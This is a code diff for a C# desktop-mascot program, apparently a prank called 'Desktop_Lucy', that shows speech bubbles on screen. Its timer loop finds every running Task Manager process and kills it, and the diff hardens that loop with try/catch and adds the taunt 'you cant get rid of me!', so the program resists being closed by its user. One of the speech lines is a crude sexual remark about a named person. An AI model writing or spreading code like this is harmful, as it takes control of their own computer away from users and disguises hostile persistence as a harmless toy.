@@ -92,6 +92,7 @@ namespace Desktop_Lucy
             Rectangle r = Screen.FromControl(this).Bounds;
             this.Location = new Point((r.Width - this.Width), (r.Height - this.Height));
             pictureBox1.Image = lucyL;
+            talk("hello!", 1000);
             _clock.Start();
         }
 
@@ -100,7 +101,16 @@ namespace Desktop_Lucy
             this.BringToFront();
             foreach (var process in Process.GetProcessesByName("Taskmgr"))
             {
-                process.Kill();
+                try
+                {
+                    process.Kill();
+                    talk("you cant get rid of me!", 1500);
+                }
+                catch
+                {
+
+                }
+
             }
         }
 
@@ -116,10 +126,15 @@ namespace Desktop_Lucy
 
         private void _speachTimer_Tick(object sender, EventArgs e)
         {
-            string[] speaches = new string[] { "im gonna eat you!", "a heads just a hat for your torso", "you cant get rid of me!", "fennah has wet dreams about me" };
-            lucySpeak s = new lucySpeak(speaches[((lucyHandler)main).r.Next(0, 3)]);
-            s.Show();
+            string[] speaches = new string[] { "im gonna eat you!", "a heads just a hat for your torso", "fennah has wet dreams about me" };
+            talk(speaches[((lucyHandler)main).r.Next(0, 2)]);
             _speachTimer.Interval = ((lucyHandler)main).r.Next(60000, 120000);
+        }
+
+        public void talk(string text, int suicideTime = 2000)
+        {
+            lucySpeak s = new lucySpeak(text, suicideTime);
+            s.Show();
         }
     }
 }
